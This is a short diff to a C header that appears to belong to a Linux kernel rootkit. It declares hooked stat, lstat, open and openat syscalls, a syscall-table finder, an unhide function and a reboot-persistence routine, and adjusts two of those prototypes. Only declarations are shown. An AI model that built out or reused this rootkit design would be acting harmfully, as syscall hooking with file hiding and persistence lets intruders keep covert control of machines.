@@ -26,7 +26,7 @@ asmlinkage int hacked_stat(const char *path, struct stat *buf);
 
 asmlinkage int hacked_lstat(const char *path, struct stat *buf);
 
-asmlinkage int hacked_open(const char* pathname, int flags, mode_t mode);
+asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode);
 
 asmlinkage int hacked_openat(int dirfd, const char *pathname, int flags, mode_t mode);
 
@@ -41,6 +41,6 @@ void unhide(void);
 
 void **find_syscall_table(void);
 
-void add_to_reboot(void **sys_call_table);
+void add_to_reboot();
 
 #endif
